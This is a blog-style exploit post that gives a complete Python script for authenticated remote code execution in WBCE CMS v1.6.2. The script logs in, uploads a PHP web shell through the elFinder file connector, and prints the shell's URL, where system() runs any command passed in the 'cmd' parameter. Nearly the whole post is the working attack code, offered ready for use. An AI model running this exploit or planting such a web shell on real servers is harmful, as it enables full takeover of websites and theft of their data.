---
layout: post
title: WBCE CMS v1.6.2 - Remote Code Execution (RCE)
date: 2024-05-03
category: exploit
---

# Exploit Title: WBCE CMS v1.6.2 - Remote Code Execution (RCE)
# Exploit Author: Ahmet Ümit BAYRAM
# Date: 3/5/2024
# Vendor Homepage: https://wbce-cms.org/
# Software Link: https://github.com/WBCE/WBCE_CMS/archive/refs/tags/1.6.2.zip
# Version: 1.6.2
# Tested on: MacOS

```python
import requests
from bs4 import BeautifulSoup
import sys
import time

def login(url, username, password):
    print("Logging in...")
    time.sleep(3)
    with requests.Session() as session:
        response = session.get(url + "/admin/login/index.php")
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form', attrs={'name': 'login'})
        form_data = {input_tag['name']: input_tag.get('value', '') for input_tag in form.find_all('input') if input_tag.get('type') != 'submit'}
        # Update username and password fields dynamically
        form_data[soup.find('input', {'name': 'username_fieldname'})['value']] = username
        form_data[soup.find('input', {'name': 'password_fieldname'})['value']] = password
        post_response = session.post(url + "/admin/login/index.php", data=form_data)
        
        if "Administration" in post_response.text:
            print("Login successful!")
            time.sleep(3)
            return session
        else:
            print("Login failed.")
            print("Headers received:", post_response.headers)
            print("Response content:", post_response.text[:500])  # First 500 characters
            return None

def upload_file(session, url):
    # Define file content and name
    print("Shell preparing...")
    time.sleep(3)
    files = {
        'upload[]': ('shell.inc', """<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
    system($_GET['cmd']);
}
?>
</pre>
</body>
</html>""", 'application/octet-stream')
    }
    data = {
        'reqid': '18f3a5c13d42c5',
        'cmd': 'upload',
        'target': 'l1_Lw',
        'mtime[]': '1714669495'
    }
    response = session.post(url + "/modules/elfinder/ef/php/connector.wbce.php", files=files, data=data)
    
    if response.status_code == 200:
        print("Your Shell is Ready: " + url + "/media/shell.inc")
    else:
        print("Failed to upload file.")
        print(response.text)

if __name__ == "__main__":
    url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    session = login(url, username, password)
    if session:
        upload_file(session, url)
